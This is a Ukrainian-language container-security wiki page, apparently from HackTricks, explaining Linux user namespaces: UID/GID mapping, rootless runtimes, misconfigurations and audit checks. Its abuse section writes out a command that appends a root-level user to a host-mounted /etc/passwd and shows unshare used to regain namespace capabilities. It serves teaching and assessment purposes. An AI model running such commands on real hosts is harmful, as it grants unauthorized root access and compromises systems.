# User Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

User namespace змінює значення ідентифікаторів користувачів і груп, дозволяючи kernel зіставляти ідентифікатори, видимі всередині namespace, з іншими ідентифікаторами за його межами. Це один із найважливіших сучасних захистів контейнерів, оскільки він безпосередньо усуває найбільшу історичну проблему класичних контейнерів: **root усередині контейнера раніше був небезпечно близьким до root на host**.

Завдяки user namespaces процес може працювати як UID 0 усередині контейнера й водночас відповідати непривілейованому діапазону UID на host. Це означає, що процес може поводитися як root для багатьох завдань усередині контейнера, залишаючись значно менш потужним з погляду host. Це не вирішує всіх проблем безпеки контейнерів, але суттєво змінює наслідки компрометації контейнера.

## Робота

User namespace має такі mapping-файли, як `/proc/self/uid_map` і `/proc/self/gid_map`, які описують, як ідентифікатори namespace перетворюються на ідентифікатори батьківського namespace. Якщо root усередині namespace зіставляється з непривілейованим UID на host, операції, для яких потрібен справжній root на host, уже не мають такої самої сили. Саме тому user namespaces є основою **rootless containers** і однією з найбільших відмінностей між старими rootful defaults контейнерів і сучаснішими дизайнами з мінімальними привілеями.

Суть тонка, але критично важлива: root усередині контейнера не усувається, а **перекладається**. Процес і надалі локально працює в середовищі, подібному до root, але host не повинен сприймати його як повноцінний root.

## Лабораторна робота

Ручний тест:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Це робить поточного користувача root усередині namespace, водночас він не є host root за його межами. Це один із найкращих простих прикладів для розуміння того, чому user namespaces настільки цінні.

У контейнерах можна порівняти видиме відображення за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Точний результат залежить від того, чи використовує engine переназначення user namespace, чи більш традиційну конфігурацію rootful.

Ви також можете прочитати mapping з боку host за допомогою:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Використання під час виконання

Rootless Podman є одним із найяскравіших прикладів того, як user namespaces використовуються як повноцінний механізм безпеки. Rootless Docker також залежить від них. Підтримка Docker userns-remap також підвищує безпеку розгортань із rootful daemon, хоча історично багато розгортань залишали її вимкненою з міркувань сумісності. Підтримка user namespaces у Kubernetes покращилася, але рівень використання та значення за замовчуванням відрізняються залежно від runtime, дистрибутива та політики кластера. Системи Incus/LXC також значною мірою покладаються на зсув UID/GID та ідеї idmapping.

Загальна тенденція очевидна: середовища, які серйозно використовують user namespaces, зазвичай дають кращу відповідь на запитання «що насправді означає root контейнера?», ніж середовища, які їх не використовують.

## Розширені деталі мапінгу

Коли непривілейований процес записує дані до `uid_map` або `gid_map`, kernel застосовує суворіші правила, ніж у випадку привілейованого записувача з батьківського namespace. Дозволені лише обмежені мапінги, а для `gid_map` записувачу зазвичай спочатку потрібно вимкнути `setgroups(2)`:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Ця деталь важлива, оскільки пояснює, чому налаштування user namespace іноді завершується помилкою в rootless-експериментах і чому runtime потребують ретельно продуманої допоміжної логіки для делегування UID/GID.

Ще однією розширеною функцією є **ID-mapped mount**. Замість зміни власника на диску, ID-mapped mount застосовує mapping user namespace до mount, завдяки чому власник відображається перекладеним у представленні цього mount. Це особливо актуально для rootless і сучасних runtime, оскільки дає змогу використовувати спільні host paths без рекурсивних операцій `chown`. З погляду безпеки ця функція змінює те, наскільки доступним для запису виглядає bind mount зсередини namespace, хоча й не перезаписує метадані базової файлової системи.

Насамкінець пам’ятайте: коли процес створює новий user namespace або входить до нього, він отримує повний набір capabilities **усередині цього namespace**. Це не означає, що він раптово отримав глобальні права на host. Це означає, що ці capabilities можна використовувати лише там, де це дозволяють модель namespace та інші засоби захисту. Саме тому `unshare -U` може раптово зробити можливими mount або привілейовані операції, обмежені namespace, не усуваючи безпосередньо межу root на host.

## Неправильні налаштування

Основна слабкість полягає просто у невикористанні user namespaces у середовищах, де вони були б можливими. Якщо root контейнера має надто пряме відображення на root host, доступні для запису host mounts і привілейовані операції ядра стають значно небезпечнішими. Інша проблема — примусове спільне використання user namespace host або вимкнення remapping заради сумісності без усвідомлення того, наскільки це змінює межу довіри.

User namespaces також потрібно розглядати разом з іншими компонентами моделі. Навіть коли вони активні, широке надання доступу до API runtime або дуже слабка конфігурація runtime все одно можуть дозволити privilege escalation іншими шляхами. Але без них багато старих класів breakout стають значно простішими для експлуатації.

## Зловживання

Якщо контейнер працює у rootful-режимі без розділення user namespace, доступний для запису host bind mount стає набагато небезпечнішим, оскільки процес може фактично записувати дані від імені root host. Небезпечні capabilities також набувають більшого значення. Зловмиснику більше не потрібно так наполегливо долати межу трансляції, оскільки цієї межі майже не існує.

Наявність або відсутність user namespace слід перевіряти на ранньому етапі оцінювання шляху container breakout. Це не дає відповіді на всі запитання, але одразу показує, чи має «root у контейнері» безпосереднє значення для host.

Найпрактичніший шаблон зловживання полягає в тому, щоб підтвердити mapping, а потім одразу перевірити, чи можна записувати дані в змонтований з host вміст із привілеями, релевантними для host:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Якщо файл створено як root реального хоста, ізоляція user namespace фактично відсутня для цього шляху. На цьому етапі стають реалістичними класичні зловживання файлами хоста:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Безпечнішим підтвердженням під час оцінювання в реальному середовищі є запис benign marker замість модифікації критичних файлів:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Ці перевірки важливі, оскільки вони швидко дають відповідь на реальне питання: чи відповідає root у цьому container достатньо близько root на host, щоб writable mount на host одразу став шляхом до компрометації host?

### Повний приклад: відновлення локальних для namespace capabilities

Якщо seccomp дозволяє `unshare`, а середовище дає змогу створити новий user namespace, процес може відновити повний набір capabilities у цьому новому namespace:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Це саме по собі не є host escape. Причина, чому це важливо: user namespaces можуть повторно ввімкнути привілейовані дії, локальні для namespace, які згодом можуть поєднатися зі слабкими mount, уразливими ядрами або недостатньо захищеними runtime surfaces.

## Перевірки

Ці команди мають відповісти на найважливіше питання на цій сторінці: у що на host відображається root усередині цього container?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
Що тут цікаво:

- Якщо процес має UID 0, а maps показують пряме або дуже близьке відображення до root хоста, контейнер є значно небезпечнішим.
- Якщо root відображається на непривілейований діапазон хоста, це набагато безпечніша базова конфігурація і зазвичай свідчить про справжню ізоляцію user namespace.
- Файли відображень є ціннішими за один лише `id`, оскільки `id` показує лише ідентичність у межах namespace.

Якщо workload працює з UID 0, а mapping показує, що це майже відповідає root хоста, слід набагато суворіше оцінювати решту привілеїв контейнера.
